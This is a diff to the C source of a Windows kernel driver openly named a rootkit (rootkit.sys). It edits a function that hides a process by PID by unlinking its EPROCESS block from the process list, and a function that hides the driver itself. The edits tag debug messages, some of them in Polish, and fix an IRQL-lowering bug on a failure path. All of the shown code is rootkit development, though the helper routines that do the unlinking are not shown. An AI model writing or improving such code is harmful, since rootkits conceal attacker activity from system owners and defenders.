@@ -12,21 +12,22 @@ BOOLEAN OnProcessHide(IN ULONG pid)
 	PEPROCESS eproc = 0;
 	KIRQL tmpIrql;
 
-	DbgPrint("PID to hide: %d",pid);
+	DbgPrint("rootkit: PID to hide: %ld\n",pid);
 
 	tmpIrql = RaiseIRQLevel();
 
 	eproc = (PEPROCESS)FindProcessEPROCByPid( pid );
 
-	DbgPrint( "EPROC: %x ",eproc);
 	if (eproc == NULL ) {
-		DbgPrint("Cant find process EPROC\n");	 
+		DbgPrint("rootkit: Nie moge znalezc bloku EPROCESS\n");	 
+  	    LowerIRQLevel( tmpIrql );		
 		return FALSE;
 	}
 	
 	HideProcessFromProcessList( eproc );
-
+	
 	LowerIRQLevel( tmpIrql );
+
 
 	return TRUE;
 }
@@ -127,7 +128,7 @@ BOOLEAN HideModule()
 
 	RtlInitUnicodeString( &driverToHide, L"rootkit.sys" );
 
-	DbgPrint("Chowam driver: %S\n",driverToHide.Buffer);
+	DbgPrint("rootkit: Chowam driver: %S\n",driverToHide.Buffer);
 
 //	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);
 
